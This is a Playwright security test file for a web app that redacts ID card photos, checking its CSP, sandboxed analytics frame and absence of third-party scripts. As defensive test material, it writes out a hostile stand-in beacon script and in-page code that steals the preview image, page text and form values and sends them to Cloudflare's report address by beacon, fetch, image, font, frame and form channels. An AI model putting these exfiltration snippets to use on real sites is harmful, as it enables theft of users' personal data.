// SPDX-License-Identifier: AGPL-3.0-or-later
// No third-party script in the page that holds the photos (ADR 0023), and visit counts only from an
// isolated frame (ADR 0024). A review on 2026-11-26 showed that Cloudflare's analytics beacon
// (ADR 0015), or a substitute served at its address, could read the unredacted preview and send it
// to Cloudflare's report address. These tests serve the build as the public site, so the host checks
// run as they would there, and they answer Cloudflare's addresses with a hostile script. They fail if
// any script from another origin runs in the app's page, if the app's page sends anything out, or if
// the counter frame can reach the app's page.
import { expect, test, type BrowserContext, type Page, type Request } from '@playwright/test'
import { NAMES, WATERMARK, canariesIn } from './canaries.ts'
import { controlled, toEditor, toEditorWithText } from './helpers.ts'
import { STATS_URL } from '../../src/analytics/stats-frame.ts'

test.use({ locale: 'es-ES', baseURL: 'https://dnitapado.es/' })

const LOCAL = 'http://localhost:4173/'
/** The public host names the site runs on: one at the root, one under a subpath. */
const ROOT = 'https://dnitapado.es/'
const SITES = [ROOT, 'https://aasanchez.github.io/dnilimpio.es/']
const BEACON = 'https://static.cloudflareinsights.com/beacon.min.js'
const REPORT = 'https://cloudflareinsights.com/cdn-cgi/rum'

/**
 * Stands in for a hostile beacon, wherever it runs: it tries to read the preview from its own page
 * and from the page around it, and sends what it got to Cloudflare's report address.
 */
const HOSTILE = `
let got = 'nothing'
try { got = document.querySelector('#preview').toDataURL('image/png') } catch {}
try { got = parent.document.querySelector('#preview').toDataURL('image/png') } catch {}
try { got = top.document.body.innerHTML } catch {}
navigator.sendBeacon(${JSON.stringify(REPORT)}, got)
`

/** Stands in for the counter page in aasanchez/dnitapado-stats, with the same CSP. */
const STATS_PAGE = `<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src ${BEACON}; connect-src https://cloudflareinsights.com; base-uri 'none'; form-action 'none'; object-src 'none'">
<meta name="referrer" content="no-referrer">
<script defer src="${BEACON}" data-cf-beacon='{"token": "test"}'></script></head><body></body></html>`

interface Sent { from: 'app' | 'frame'; method: string; url: string; body: string; referer: string | undefined }
interface Traffic { sent: Sent[] }

/** Whether a request comes from the app's own page (or its workers) or from a frame inside it. */
function source (req: Request): 'app' | 'frame' {
  try {
    const frame = req.frame()
    if (req.isNavigationRequest() && req.url() === STATS_URL) return 'frame'
    return frame.parentFrame() === null ? 'app' : 'frame'
  } catch {
    return 'app' // from a service worker or web worker of the app
  }
}

/**
 * Serves the local build at each public address and the counter page at its address. Every other
 * request is recorded; Cloudflare's addresses are answered (with the hostile script), so only the
 * browser's own rules can stop them.
 */
async function asPublicSite (context: BrowserContext): Promise<Traffic> {
  const traffic: Traffic = { sent: [] }
  await context.route('**/*', async (route) => {
    const req = route.request()
    const url = req.url()
    const site = SITES.find((s) => url.startsWith(s))
    if (site !== undefined) {
      const res = await fetch(LOCAL + url.slice(site.length))
      const headers = Object.fromEntries([...res.headers].filter(([k]) => !['content-encoding', 'content-length'].includes(k)))
      await route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) })
      return
    }
    if (/^(blob|data):/.test(url)) { await route.continue(); return }
    traffic.sent.push({ from: source(req), method: req.method(), url, body: req.postData() ?? '', referer: req.headers()['referer'] })
    if (url === STATS_URL) await route.fulfill({ contentType: 'text/html', body: STATS_PAGE })
    else if (url === BEACON) await route.fulfill({ contentType: 'text/javascript', body: HOSTILE })
    else if (url.startsWith(REPORT)) await route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' } })
    else await route.abort('blockedbyclient')
  })
  return traffic
}

const fromApp = (t: Traffic): string[] => t.sent.filter((s) => s.from === 'app').map((s) => `${s.method} ${s.url}`)

/** Records the address of every script element that is ever added to the page, from the first byte. */
async function watchScripts (page: Page): Promise<void> {
  await page.addInitScript(() => {
    if (window !== window.top) return // only the app's own page
    const seen: string[] = []
    Object.defineProperty(window, '__scripts', { value: seen })
    new MutationObserver((records) => {
      for (const r of records) {
        for (const n of r.addedNodes) if (n instanceof HTMLScriptElement) seen.push(n.src === '' ? `inline:${n.type}` : n.src)
      }
    }).observe(document, { childList: true, subtree: true })
  })
}

/** Every script the app's page ever had, every script it holds now, and every resource it fetched. */
async function scriptsAndResources (page: Page): Promise<{ added: string[]; present: string[]; resources: string[] }> {
  return await page.evaluate(() => ({
    added: (window as unknown as { __scripts: string[] }).__scripts,
    present: [...document.scripts].map((s) => (s.src === '' ? `inline:${s.type}` : s.src)),
    // The frame's own navigation shows here as an 'iframe' entry; its resources do not.
    resources: performance.getEntriesByType('resource').filter((e) => (e as PerformanceResourceTiming).initiatorType !== 'iframe').map((e) => e.name),
  }))
}

/** Scripts that do not come from this site: anything other than its own origin or the import map. */
function thirdParty (urls: string[], origin: string): string[] {
  return urls.filter((u) => u !== 'inline:importmap' && !/^(blob|data):/.test(u) && new URL(u).origin !== origin)
}

/** The counter frame's report, once it arrives. */
async function frameReport (traffic: Traffic): Promise<Sent> {
  await expect.poll(() => traffic.sent.some((s) => s.from === 'frame' && s.url.startsWith(REPORT)), { timeout: 15_000 }).toBe(true)
  const report = traffic.sent.find((s) => s.from === 'frame' && s.url.startsWith(REPORT))
  if (report === undefined) throw new Error('no report')
  return report
}

for (const site of SITES) {
  test(`at ${site}, with a card loaded, no third-party script runs in the app's page and the page sends nothing`, async ({ page, context }) => {
    const traffic = await asPublicSite(context)
    await watchScripts(page)
    await page.goto(site)
    await expect(page.locator('h1')).toBeVisible()
    await page.locator('#start').click()
    await page.locator('#file-front').setInputFiles('tests/fixtures/synthetic-front.png')
    await expect(page.locator('#status-front')).toHaveText('Imagen cargada.')
    await page.waitForTimeout(6000) // past the idle callback that loaded the beacon before ADR 0023
    const origin = new URL(site).origin
    const s = await scriptsAndResources(page)
    expect(s.present.length).toBeGreaterThan(0)
    expect(thirdParty(s.added, origin)).toEqual([])
    expect(thirdParty(s.present, origin)).toEqual([])
    expect(thirdParty(s.resources, origin)).toEqual([])
    expect(fromApp(traffic)).toEqual([])
    // With a photo loaded there is no frame at all.
    await expect(page.locator('iframe')).toHaveCount(0)
  })
}

test('under the service worker, the editor with both sides runs no third-party script', async ({ browser }) => {
  test.setTimeout(120_000)
  const context = await browser.newContext({ serviceWorkers: 'allow', locale: 'es-ES', baseURL: ROOT })
  const page = await context.newPage()
  const traffic = await asPublicSite(context)
  await watchScripts(page)
  await controlled(page)
  await toEditor(page)
  await page.waitForTimeout(6000)
  const s = await scriptsAndResources(page)
  expect(thirdParty(s.added, 'https://dnitapado.es')).toEqual([])
  expect(thirdParty(s.present, 'https://dnitapado.es')).toEqual([])
  expect(fromApp(traffic)).toEqual([])
  await expect(page.locator('iframe')).toHaveCount(0)
  await context.close()
})

test('the CSP allows no third-party script, no connection, and one frame: the counter page', async ({ page, context }) => {
  await asPublicSite(context)
  await page.goto(ROOT)
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content') ?? ''
  const directive = (name: string): string[] => csp.split(';').map((d) => d.trim().split(/\s+/)).find((d) => d[0] === name)?.slice(1) ?? []
  // Only this site's files, WebAssembly compilation and the import map's hash.
  expect(directive('script-src').filter((v) => !/^'sha256-[A-Za-z0-9+/=]+'$/.test(v))).toEqual(["'self'", "'wasm-unsafe-eval'"])
  expect(directive('connect-src')).toEqual(["'none'"])
  expect(directive('default-src')).toEqual(["'none'"])
  expect(directive('frame-src')).toEqual([STATS_URL])
})

test('the audit attack fails: a substitute beacon cannot be loaded or send the preview', async ({ page, context }) => {
  test.setTimeout(120_000)
  const traffic = await asPublicSite(context)
  await toEditor(page)
  await expect(page.locator('#preview')).toHaveJSProperty('width', 1712)
  const result = await page.evaluate(async (src) => {
    // 1. Adding the old beacon by its address: Trusted Types refuses the URL, and the CSP would too.
    let added = 'loaded'
    try {
      const s = document.createElement('script')
      s.src = src
      await new Promise<void>((resolve, reject) => { s.onload = () => { resolve() }; s.onerror = () => { reject(new Error('blocked')) }; document.head.append(s) })
    } catch (e) {
      added = e instanceof Error ? e.name : 'blocked'
    }
    // 2. Code already in the page (as the beacon was) reads the preview and tries to send it.
    const png = (document.querySelector('#preview') as HTMLCanvasElement).toDataURL('image/png')
    // eslint-disable-next-line no-restricted-properties -- this test checks that the CSP blocks it
    const beacon = navigator.sendBeacon('https://cloudflareinsights.com/cdn-cgi/rum', png)
    let fetched = 'sent'
    try {
      await fetch('https://cloudflareinsights.com/cdn-cgi/rum', { method: 'POST', body: png, mode: 'no-cors' })
    } catch {
      fetched = 'blocked'
    }
    return { added, beacon: String(beacon), fetched, bytes: png.length }
  }, BEACON)
  expect(result.bytes).toBeGreaterThan(16_000) // the preview is there to steal
  expect(result.added).not.toBe('loaded')
  expect(result.fetched).toBe('blocked')
  // sendBeacon() may answer true and be stopped later: only the recorded traffic tells.
  await page.waitForTimeout(2000)
  expect(fromApp(traffic)).toEqual([])
  // The counter frame reported once, from the start screen, before any photo, and without a photo.
  for (const s of traffic.sent.filter((x) => x.url.startsWith(REPORT))) expect(s.body).not.toMatch(/data:image/)
})

test('page code that gathers file names, OCR text and the watermark cannot send them anywhere', async ({ browser }) => {
  test.setTimeout(180_000)
  // Under the service worker, as on the public site, so OCR runs (its worker gets its CSP there).
  const context = await browser.newContext({ serviceWorkers: 'allow', locale: 'es-ES', baseURL: ROOT })
  const page = await context.newPage()
  const traffic = await asPublicSite(context)
  await controlled(page)
  // Fictional card text (read by OCR), canary file names, then smart find and a canary watermark.
  await toEditorWithText(page, { names: NAMES })
  await expect(page.locator('#find-run')).toBeEnabled({ timeout: 30_000 })
  await page.locator('#find-run').click()
  await expect(page.locator('#find-status')).toContainText(/Se han añadido \d+ recuadros/, { timeout: 150_000 })
  await page.locator('#tool-mark').click()
  await page.locator('#watermark').fill(WATERMARK)
  const loot = await page.evaluate(async (report) => {
    // What a script in the page could gather: the page text, every form value and the photos.
    const values = [...document.querySelectorAll('input, textarea')].map((e) => (e as HTMLInputElement).value)
    const text = [document.body.innerText, ...values, document.title, location.href].join('\n')
    const png = (document.querySelector('#preview') as HTMLCanvasElement).toDataURL('image/png')
    const payload = `${text}\n${png}`
    const q = encodeURIComponent(text.slice(0, 1500))
    // Every way out that needs no new script: beacon, fetch, image, style sheet, font, frame, form.
    // eslint-disable-next-line no-restricted-properties -- this test checks that the browser blocks it
    navigator.sendBeacon(report, payload)
    await fetch(report, { method: 'POST', body: payload, mode: 'no-cors' }).catch(() => {})
    const img = new Image(); img.src = `${report}?i=${q}`
    const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = `${report}?s=${q}`; document.head.append(link)
    await new FontFace('x', `url(${report}?f=${q})`).load().catch(() => {})
    const frame = document.createElement('iframe'); frame.src = `${report}?d=${q}`; document.body.append(frame)
    const form = document.createElement('form'); form.method = 'post'; form.action = report; form.target = 'x'
    const field = document.createElement('input'); field.name = 'd'; field.value = text; form.append(field); document.body.append(form)
    try { form.submit() } catch {}
    return text
  }, REPORT)
  // The data was there to steal: the watermark and the card text are in the page.
  expect(canariesIn(loot).length).toBeGreaterThan(0)
  await page.waitForTimeout(3000)
  // Nothing left the app's page, and no request anywhere (counter frame included) carried a canary.
  expect(fromApp(traffic)).toEqual([])
  expect(traffic.sent.flatMap((s) => canariesIn(s.url, s.body))).toEqual([])
  await context.close()
})

test.describe('counter frame (ADR 0024)', () => {
  test('on the start screen: another site, sandboxed, given nothing, and it counts the visit', async ({ page, context }) => {
    const traffic = await asPublicSite(context)
    await page.goto(ROOT)
    const frame = page.locator('iframe#stats-frame')
    await expect(frame).toHaveCount(1)
    // Exactly the counter's address: no query string, no fragment, nothing about the visit.
    await expect(frame).toHaveAttribute('src', STATS_URL)
    await expect(frame).toHaveAttribute('sandbox', 'allow-scripts')
    await expect(frame).toHaveAttribute('referrerpolicy', 'no-referrer')
    const report = await frameReport(traffic)
    // The hostile script inside the frame could read nothing from the app's page.
    expect(report.body).toBe('nothing')
    const nav = traffic.sent.find((s) => s.url === STATS_URL)
    expect(nav?.referer).toBeUndefined()
    // The frame is the only thing that left, and the app's page itself sent nothing.
    expect(fromApp(traffic)).toEqual([])
    expect(traffic.sent.filter((s) => s.from === 'frame').map((s) => s.url.split('?')[0])).toEqual([STATS_URL, BEACON, REPORT])
  })

  test('is removed when the person starts and does not come back with photos loaded', async ({ page, context }) => {
    const traffic = await asPublicSite(context)
    await page.goto(ROOT)
    await frameReport(traffic)
    await page.locator('#start').click()
    await expect(page.locator('iframe')).toHaveCount(0)
    await page.locator('#file-front').setInputFiles('tests/fixtures/synthetic-front.png')
    await expect(page.locator('#status-front')).toHaveText('Imagen cargada.')
    // The logo returns to the start screen and keeps the photos: no frame there now.
    await page.locator('#brand').click()
    await expect(page.locator('#start')).toBeVisible()
    await page.waitForTimeout(2000)
    await expect(page.locator('iframe')).toHaveCount(0)
    expect(traffic.sent.filter((s) => s.url === STATS_URL)).toHaveLength(1)
  })

  test('the frame cannot reach the app even if it were shown beside a photo', async ({ page, context }) => {
    // Puts a frame with the same attributes next to a loaded photo, to prove the isolation itself.
    const traffic = await asPublicSite(context)
    await page.goto(ROOT)
    await frameReport(traffic)
    await page.locator('#start').click()
    await page.locator('#file-front').setInputFiles('tests/fixtures/synthetic-front.png')
    await expect(page.locator('#status-front')).toHaveText('Imagen cargada.')
    const before = traffic.sent.length
    await page.evaluate((src) => {
      const f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-scripts')
      f.setAttribute('referrerpolicy', 'no-referrer')
      f.src = src
      document.body.append(f)
    }, STATS_URL)
    await expect.poll(() => traffic.sent.slice(before).filter((s) => s.url.startsWith(REPORT)).length, { timeout: 15_000 }).toBe(1)
    for (const s of traffic.sent.slice(before)) expect(s.body).toBe(s.url.startsWith(REPORT) ? 'nothing' : '')
  })

  for (const [name, init] of [
    ['offline', () => { Object.defineProperty(Navigator.prototype, 'onLine', { get: () => false }) }],
    ['Global Privacy Control', () => { Object.defineProperty(Navigator.prototype, 'globalPrivacyControl', { get: () => true }) }],
    ['Do Not Track', () => { Object.defineProperty(Navigator.prototype, 'doNotTrack', { get: () => '1' }) }],
  ] as const) {
    test(`is not shown when the browser is ${name === 'offline' ? 'offline' : `asking for ${name}`}`, async ({ page, context }) => {
      await context.addInitScript(init)
      const traffic = await asPublicSite(context)
      await page.goto(ROOT)
      await expect(page.locator('h1')).toBeVisible()
      await page.waitForTimeout(2000)
      await expect(page.locator('iframe')).toHaveCount(0)
      expect(traffic.sent).toEqual([])
    })
  }

  test('is not shown on other hosts', async ({ page }) => {
    const foreign: string[] = []
    page.on('request', (r) => { if (!r.url().startsWith(LOCAL) && !/^(blob|data):/.test(r.url())) foreign.push(r.url()) })
    await page.goto(LOCAL)
    await expect(page.locator('h1')).toBeVisible()
    await page.waitForTimeout(2000)
    await expect(page.locator('iframe')).toHaveCount(0)
    expect(foreign).toEqual([])
  })
})
